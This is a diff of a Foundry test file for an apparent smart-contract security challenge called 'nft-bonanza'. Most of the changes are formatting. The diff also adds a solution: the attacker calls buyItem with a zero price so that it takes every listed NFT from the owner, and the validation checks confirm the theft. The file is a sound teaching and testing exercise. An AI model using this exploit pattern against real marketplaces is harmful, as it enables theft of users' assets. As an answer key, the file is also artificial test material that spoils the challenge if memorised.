@@ -9,14 +9,12 @@ import {Token} from "src/other/Token.sol";
 import {Nft721} from "src/other/Nft721.sol";
 import {BonanzaMarketplace} from "src/nft-bonanza/BonanzaMarketplace.sol";
 
-
 contract Testing is Test {
-
-    address attacker = makeAddr('attacker');
-    address o1 = makeAddr('o1');
-    address o2 = makeAddr('o2');
-    address admin = makeAddr('admin'); // should not be used
-    address adminUser = makeAddr('adminUser'); // should not be used
+    address attacker = makeAddr("attacker");
+    address o1 = makeAddr("o1");
+    address o2 = makeAddr("o2");
+    address admin = makeAddr("admin"); // should not be used
+    address adminUser = makeAddr("adminUser"); // should not be used
 
     Token usdc;
     Nft721 nftA;
@@ -25,7 +23,6 @@ contract Testing is Test {
 
     /// preliminary state
     function setUp() public {
-
         // funding accounts
         vm.deal(admin, 10_000 ether);
         vm.deal(attacker, 10_000 ether);
@@ -36,7 +33,7 @@ contract Testing is Test {
         usdc = new Token('USDC','USDC');
 
         vm.prank(admin);
-        usdc.mint(adminUser,100e18);
+        usdc.mint(adminUser, 100e18);
 
         vm.prank(admin);
         nftA = new Nft721('APES','APES');
@@ -45,9 +42,9 @@ contract Testing is Test {
 
         // --adminUser minted NFTs from collections A & B
         vm.prank(admin);
-        nftA.mintForUser(adminUser,1);
+        nftA.mintForUser(adminUser, 1);
         vm.prank(admin);
-        nftB.mintForUser(adminUser,1);
+        nftB.mintForUser(adminUser, 1);
 
         // deploying the marketplace & setup
         vm.prank(admin);
@@ -60,22 +57,22 @@ contract Testing is Test {
 
         // adminUser lists NFTs on the bonanza marketplace
         vm.prank(adminUser);
-        nftA.setApprovalForAll(address(bonanzaMarketplace),true);
+        nftA.setApprovalForAll(address(bonanzaMarketplace), true);
         vm.prank(adminUser);
-        nftB.setApprovalForAll(address(bonanzaMarketplace),true);
+        nftB.setApprovalForAll(address(bonanzaMarketplace), true);
 
         vm.prank(adminUser);
-        bonanzaMarketplace.createListing(address(nftA),0,1,100e18,0);
+        bonanzaMarketplace.createListing(address(nftA), 0, 1, 100e18, 0);
         vm.prank(adminUser);
-        bonanzaMarketplace.createListing(address(nftB),0,1,100e18,0);
-
+        bonanzaMarketplace.createListing(address(nftB), 0, 1, 100e18, 0);
     }
 
     /// solves the challenge
     function testChallengeExploit() public {
-        vm.startPrank(attacker,attacker);
-        
-        // implement solution here
+        vm.startPrank(attacker, attacker);
+
+        bonanzaMarketplace.buyItem(address(nftA),0,adminUser,0);
+        bonanzaMarketplace.buyItem(address(nftB),0,adminUser,0);
 
         vm.stopPrank();
         validation();
@@ -83,13 +80,10 @@ contract Testing is Test {
 
     /// expected final state
     function validation() public {
-
         // attacker steals all listed NFTs from bonanza marketplace
-        assertEq(nftA.balanceOf(adminUser),0);
-        assertEq(nftB.balanceOf(adminUser),0);
-        assertEq(nftA.balanceOf(attacker),1);
-        assertEq(nftB.balanceOf(attacker),1);
-
+        assertEq(nftA.balanceOf(adminUser), 0);
+        assertEq(nftB.balanceOf(adminUser), 0);
+        assertEq(nftA.balanceOf(attacker), 1);
+        assertEq(nftB.balanceOf(attacker), 1);
     }
-
 }
